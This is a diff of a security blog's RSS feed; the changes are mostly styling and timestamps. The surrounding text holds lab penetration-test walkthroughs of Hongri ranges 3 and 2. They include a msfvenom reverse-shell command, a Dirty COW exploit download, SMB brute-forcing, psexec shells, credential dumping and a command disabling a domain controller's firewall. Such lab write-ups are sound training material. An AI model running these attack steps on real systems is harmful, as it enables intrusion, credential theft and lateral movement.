@@ -3,8 +3,8 @@
     
         <id>https://l1uyun.one/posts/sec/</id>
     <title type="html"><![CDATA[l1uyun's Blog]]></title>
-    <updated>2026-01-25T00:48:28+00:00</updated>
-    <generator uri="https://gohugo.io/" version="0.154.5">Hugo</generator>
+    <updated>2026-02-09T09:07:39+00:00</updated>
+    <generator uri="https://gohugo.io/" version="0.155.3">Hugo</generator>
     <author>
             <name>l1uyun</name>
             
@@ -17,7 +17,7 @@
     
             <link href="https://l1uyun.one/posts/sec/" rel="alternate" type="text/html" title="html" />
             <link href="https://l1uyun.one/posts/sec/index.xml" rel="alternate" type="application/rss+xml" title="rss" />
-    <updated>2026-01-25T00:48:28+00:00</updated>
+    <updated>2026-02-09T09:07:39+00:00</updated>
     
     
         
@@ -34,7 +34,7 @@
 <h1 id="红日靶场3">红日靶场3</h1>
 <h2 id="搭建环境">搭建环境</h2>
 <p>这个靶场只有一台web服务器暴露在外网中</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>外网网段 192.168.3.1/24
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>外网网段 192.168.3.1/24
 </span></span><span style="display:flex;"><span>攻击机 parrot 192.168.3.101
 </span></span><span style="display:flex;"><span>攻击机 wsl  192.168.3.100
 </span></span><span style="display:flex;"><span>攻击机 win  192.168.3.99
@@ -77,7 +77,7 @@
 <p>电脑卡起来了,御剑崩了,换成dirsearch,扫到了下面这个文件
 <code>http://192.168.3.3/configuration.php~</code>
 里面有数据库的账号密码</p></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>	public $dbtype <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mysqli&#39;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>	public $dbtype <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mysqli&#39;</span>;
 </span></span><span style="display:flex;"><span>	public $host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>;
 </span></span><span style="display:flex;"><span>	public $user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;testuser&#39;</span>;
 </span></span><span style="display:flex;"><span>	public $password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;cvcvgjASD!@&#39;</span>;
@@ -87,7 +87,7 @@
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_7.png" alt="" /></figure>
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>admin
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>admin
 </span></span><span style="display:flex;"><span>$2y$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>administrator
@@ -95,7 +95,7 @@
 </span></span></code></pre></div><p>bcrypt加密</p>
 <h3 id="sql添加管理员">sql添加管理员</h3>
 <p>没跑出来,<a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn" target="_blank" rel="noopener nofollow noreferrer" >添加一个新用户算了</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">`</span>am2zu_users<span style="color:#f92672">`</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">`</span>am2zu_users<span style="color:#f92672">`</span>
 </span></span><span style="display:flex;"><span>   (<span style="color:#f92672">`</span>name<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>username<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>password<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>params<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>registerDate<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>lastvisitDate<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>lastResetTime<span style="color:#f92672">`</span>)
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;Administrator2&#39;</span>, <span style="color:#e6db74">&#39;admin2&#39;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, NOW(), NOW(), NOW());
@@ -125,11 +125,11 @@
 <pre tabindex="0"><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.3.100 LPORT=4444 -f elf -o shell.elf
 </code></pre><p>没传成功&hellip;.尝试了很多反弹shell的操作,但是都没有弹成功
 最后在tmp目录下发现了凭据,前期已经知道了ssh是开放的,连上去</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -o HostKeyAlgorithms<span style="color:#f92672">=</span>+ssh-rsa -o PubkeyAcceptedAlgorithms<span style="color:#f92672">=</span>+ssh-rsa wwwuser@192.168.3.3
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -o HostKeyAlgorithms<span style="color:#f92672">=</span>+ssh-rsa -o PubkeyAcceptedAlgorithms<span style="color:#f92672">=</span>+ssh-rsa wwwuser@192.168.3.3
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>wwwuser_123Aqx
 </span></span></code></pre></div><p>ssh连上去之后上linpeas脚本,看到了这个nginx配置文件,明白是什么意思了,我拿到的webshell是在内网的192.168.93.120机器上面,而我现在的靶机的内网ip是192.168.93.100,所以我反弹不了web机器的shell回来,有公网ip的这台nginx机器是反向代理了内网的web机器</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-rw-r--r--. <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1032</span> Oct  <span style="color:#ae81ff">6</span> 20:09 /etc/nginx/nginx.conf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-rw-r--r--. <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1032</span> Oct  <span style="color:#ae81ff">6</span> 20:09 /etc/nginx/nginx.conf
 </span></span><span style="display:flex;"><span>user  nginx;
 </span></span><span style="display:flex;"><span>worker_processes  1;
 </span></span><span style="display:flex;"><span>error_log  /var/log/nginx/error.log warn;
@@ -176,7 +176,7 @@
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_13.png" alt="" /></figure>
 </p>
 <p>上传.c文件,将文件里面的用户名改成root</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>wwwuser@localhost tmp<span style="color:#f92672">]</span>$ wget 192.168.3.100/dirty.c
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>wwwuser@localhost tmp<span style="color:#f92672">]</span>$ wget 192.168.3.100/dirty.c
 </span></span><span style="display:flex;"><span>--2019-10-06 22:57:45--  http://192.168.3.100/dirty.c
 </span></span><span style="display:flex;"><span>Connecting to 192.168.3.100:80... connected.
 </span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
@@ -219,7 +219,7 @@ msf6 auxiliary(server/socks_proxy) &gt; jobs
 <p>0   Auxiliary: server/socks_proxy
 </code></pre><h2 id="内网">内网</h2></p>
 <h3 id="内网存活探测">内网存活探测</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4 nmap -sn -PE 192.168.93.1/24
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4 nmap -sn -PE 192.168.93.1/24
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains.conf
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/local/lib/libproxychains4.so
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
@@ -239,7 +239,7 @@ msf6 auxiliary(server/socks_proxy) &gt; jobs
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">256</span> IP addresses <span style="color:#f92672">(</span><span style="color:#ae81ff">6</span> hosts up<span style="color:#f92672">)</span> scanned in 1.56 seconds
 </span></span></code></pre></div><h3 id="内网web机器">内网web机器</h3>
 <p>扫一下那台内网web机器,9191端口应该是我刚刚用蚁剑的后渗透插件启动的bind-shell</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4 nmap -Pn -sT 192.168.93.120 -p22,80,3306,9191 --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4 nmap -Pn -sT 192.168.93.120 -p22,80,3306,9191 --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains.conf
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/local/lib/libproxychains4.so
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
@@ -259,15 +259,15 @@ msf6 auxiliary(server/socks_proxy) &gt; jobs
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_16.png" alt="" /></figure>
 <p>还剩下三台win机器</p></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.93.10
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.93.10
 </span></span><span style="display:flex;"><span>192.168.93.20
 </span></span><span style="display:flex;"><span>192.168.93.30
 </span></span></code></pre></div><h3 id="信息收集-1">信息收集</h3>
 <p>这里我配完proxifier之后,在浏览器里面访问了一下,发现20机器的80端口开放,先扫一下这台</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>复习一下awk,提取nmap的扫描结果中的端口号
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>复习一下awk,提取nmap的扫描结果中的端口号
 </span></span><span style="display:flex;"><span>awk -F <span style="color:#e6db74">&#39;/&#39;</span>  -v ORS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;,&#39;</span> <span style="color:#e6db74">&#39;{print $1}&#39;</span> aaa | sed <span style="color:#e6db74">&#39;s/,$//&#39;</span>
 </span></span></code></pre></div><p>win2008</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4 nmap -Pn -sT 192.168.93.20 -p80,135,139,445,1433,2383,47001,49152,49153,49154,49155,49156,49158  -A  --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4 nmap -Pn -sT 192.168.93.20 -p80,135,139,445,1433,2383,47001,49152,49153,49154,49155,49156,49158  -A  --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains.conf
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
@@ -361,7 +361,7 @@ msf6 auxiliary(server/socks_proxy) &gt; jobs
 </span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 211.63 seconds
 </span></span></code></pre></div><p>等其他两个nmap扫描的时候,才发现我忘了上内网神器fscan了&hellip;.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>root@localhost tmp<span style="color:#f92672">]</span><span style="color:#75715e"># ./fscan  -h 192.168.93.10</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>root@localhost tmp<span style="color:#f92672">]</span><span style="color:#75715e"># ./fscan  -h 192.168.93.10</span>
 </span></span><span style="display:flex;"><span>start infoscan
 </span></span><span style="display:flex;"><span>192.168.93.10:445 open
 </span></span><span style="display:flex;"><span>192.168.93.10:139 open
@@ -410,25 +410,25 @@ msf6 auxiliary(server/socks_proxy) &gt; jobs
 </span></span><span style="display:flex;"><span>已完成 3/3
 </span></span></code></pre></div><p>另外两台机器最终放弃掉nmap的扫描了,太慢了</p>
 <p>总结一下</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>test.org域内
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>test.org域内
 </span></span><span style="display:flex;"><span>192.168.93.10 win2012 DC
 </span></span><span style="display:flex;"><span>192.168.93.20 win2008 
 </span></span><span style="display:flex;"><span>另外有一台机器不在TEST域内
 </span></span><span style="display:flex;"><span>192.168.93.30 win7
 </span></span></code></pre></div><h3 id="smb凭据爆破">smb凭据爆破</h3>
 <p>到这里为止,横向移动的思路卡住了,去看了一下网上的各种解法,最常见的就是爆破smb的凭据了&hellip;.我选的几个字典都没有这个密码,手动添加一下&hellip;..</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sed -i <span style="color:#e6db74">&#39;100i 123qwe!ASD&#39;</span> rockyou.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sed -i <span style="color:#e6db74">&#39;100i 123qwe!ASD&#39;</span> rockyou.txt
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>administrator:123qwe!ASD
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba3_image_17.png" alt="" /></figure>
 <p>附上其他师傅的横向思路</p></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1、mssql要是拿到高权限（sa账号权限）可以尝试通过mssql写 shell 然后提权。
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1、mssql要是拿到高权限（sa账号权限）可以尝试通过mssql写 shell 然后提权。
 </span></span><span style="display:flex;"><span>2、在进行横向移动时，内网设备扫不出来其他漏洞，只能通过 SMB 爆破或者 NTLM Relay 攻击，SMB 爆破比较碰运气，在实际过程中可以通过收集公司及管理员信息生成对应字典；NTLM Relay 攻击类似社工钓鱼，遇到安全意识不高的管理员才有可能成功，并且在内网环境中安装Python和对应的库也是比较麻烦的，可以考虑使用 conda 等创建虚拟环境，然后一起打包上传到对应靶机，但是相应的环境配置也是比较容易出问题。
 </span></span></code></pre></div><h3 id="psexec拿shell">psexec拿shell</h3>
 <p>使用msf的windows/smb/psexec模块,拿到20,30机器的shell</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set rhosts 192.168.93.20,30
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set rhosts 192.168.93.20,30
 </span></span><span style="display:flex;"><span>rhosts <span style="color:#f92672">=</span>&gt; 192.168.93.20,30
 </span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/smb/psexec<span style="color:#f92672">)</span> &gt; run
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploiting target 192.168.93.20
@@ -463,7 +463,7 @@ msf6 auxiliary(server/socks_proxy) &gt; jobs
 </span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">8</span>         meterpreter x64/windows  NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM @ WIN7     192.168.3.100:42267 -&gt; 192.168.93.30:4444 <span style="color:#f92672">(</span>192.168.93.30<span style="color:#f92672">)</span>
 </span></span></code></pre></div><h3 id="kiwi模块获取dc凭据">kiwi模块获取DC凭据</h3>
 <p>还剩下一个域控机器,先进入win2008的会话中,加载一下kiwi</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; creds_all
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; creds_all
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Running as SYSTEM
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving all credentials
 </span></span><span style="display:flex;"><span>msv credentials
@@ -518,7 +518,7 @@ msf6 auxiliary(server/socks_proxy) &gt; jobs
 </span></span></code></pre></div><p>接下来就是尝试登录域控</p>
 <h3 id="关闭域控防火墙并拿到session">关闭域控防火墙并拿到session</h3>
 <p>这里先使用win7的session来关闭win2012域控机器的防火墙</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net use <span style="color:#ae81ff">\\</span>192.168.93.10<span style="color:#ae81ff">\i</span>pc$ <span style="color:#e6db74">&#34;zxcASDqw123!!&#34;</span> /user:<span style="color:#e6db74">&#34;Administrator&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net use <span style="color:#ae81ff">\\</span>192.168.93.10<span style="color:#ae81ff">\i</span>pc$ <span style="color:#e6db74">&#34;zxcASDqw123!!&#34;</span> /user:<span style="color:#e6db74">&#34;Administrator&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>sc <span style="color:#ae81ff">\\</span>192.168.93.10 create unablefirewall binpath<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;netsh advfirewall set allprofiles state off&#34;</span>
 </span></span><span style="display:flex;"><span>
@@ -627,7 +627,7 @@ WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、W
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba2_win%e5%9f%9f_image_11.png" alt="" /></figure>
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>web 192.168.3.80
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>web 192.168.3.80
 </span></span><span style="display:flex;"><span>pc  192.168.3.201
 </span></span><span style="display:flex;"><span>win 192.168.3.99
 </span></span><span style="display:flex;"><span>wsl kali 192.168.3.100 
@@ -635,9 +635,9 @@ WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、W
 <h3 id="信息收集">信息收集</h3>
 <p>先处理web机器</p>
 <p>端口扫描出来了不少端口,使用awk做一下处理,提取一下</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>awk -F <span style="color:#e6db74">&#39;/&#39;</span>  <span style="color:#e6db74">&#39;BEGIN {ORS=&#34;,&#34;} {print $1}&#39;</span> a.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>awk -F <span style="color:#e6db74">&#39;/&#39;</span>  <span style="color:#e6db74">&#39;BEGIN {ORS=&#34;,&#34;} {print $1}&#39;</span> a.txt
 </span></span></code></pre></div><p>进行-A扫描</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>⇒  sudo nmap -Pn -sT 192.168.3.80  -p80,135,139,445,1433,3389,7001,49152,49153,49154,60966,63624,63632,63634 -A  --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>⇒  sudo nmap -Pn -sT 192.168.3.80  -p80,135,139,445,1433,3389,7001,49152,49153,49154,60966,63624,63632,63634 -A  --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>
 </span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-09-28 19:40 EDT
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.3.80
 </span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00057s latency<span style="color:#f92672">)</span>.
@@ -800,7 +800,7 @@ WEB机和PC机：计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server、W
 </p>
 <h3 id="cs上线">CS上线</h3>
 <p>添加监听器</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>name：为监听器名字，可任意
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>name：为监听器名字，可任意
 </span></span><span style="display:flex;"><span>payload：payload类型
 </span></span><span style="display:flex;"><span>HTTP Hosts: shell反弹的主机，也就是我们kali的ip（如果是阿里云，则填阿里云主机的公网ip）
 </span></span><span style="display:flex;"><span>HTTP Hosts(Stager): Stager的马请求下载payload的地址（一般也是和上面的ip填一样）
@@ -884,7 +884,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 <p>这个漏洞需要登录，且要能够写入数据。</p>
 <h2 id="前置知识">前置知识</h2>
 <h3 id="preg_replace的e参数">preg_replace的/e参数</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">preg_replace</span> ( <span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">pattern</span>, <span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">replacement</span>, <span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">subject</span>,[<span style="color:#a6e22e">int</span> <span style="color:#a6e22e">limit</span>],[<span style="color:#a6e22e">int</span> <span style="color:#a6e22e">count</span>])
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">preg_replace</span> ( <span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">pattern</span>, <span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">replacement</span>, <span style="color:#a6e22e">mixed</span> <span style="color:#a6e22e">subject</span>,[<span style="color:#a6e22e">int</span> <span style="color:#a6e22e">limit</span>],[<span style="color:#a6e22e">int</span> <span style="color:#a6e22e">count</span>])
 </span></span><span style="display:flex;"><span>
